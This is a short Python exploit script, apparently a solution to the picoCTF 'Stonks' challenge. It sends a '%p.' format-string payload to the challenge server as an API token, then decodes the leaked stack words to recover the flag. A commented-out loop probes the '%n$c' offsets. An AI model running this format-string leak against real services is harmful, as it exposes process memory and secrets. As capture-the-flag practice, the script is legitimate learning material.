from ptrlib import *
import time
import binascii

# for i in range(300):
#     sock = Socket('mercury.picoctf.net', 53437)
#     sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
#     sock.sendline('1')
#     sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
#     sock.sendline('%{}$c'.format(i))
#     sock.recvuntil('Buying stonks with token:')
#     resp = sock.recv(128)
#     print(i, resp)
#     if b'pico' in resp:
#         break
#         print(resp)
#     if b'api' in resp:
#         break
#         print(resp)

sock = Socket('mercury.picoctf.net', 53437)
sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
sock.sendline('1')
sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
sock.sendline(b'%p.'*90)
resp = sock.recv()
a = resp.decode()

flag = b''
for v in a.split('.'):
    if not v.startswith("0x"):
        continue
    if len(v) != 10:
        continue
    flag += binascii.unhexlify(v[2:])[::-1]

print(flag)
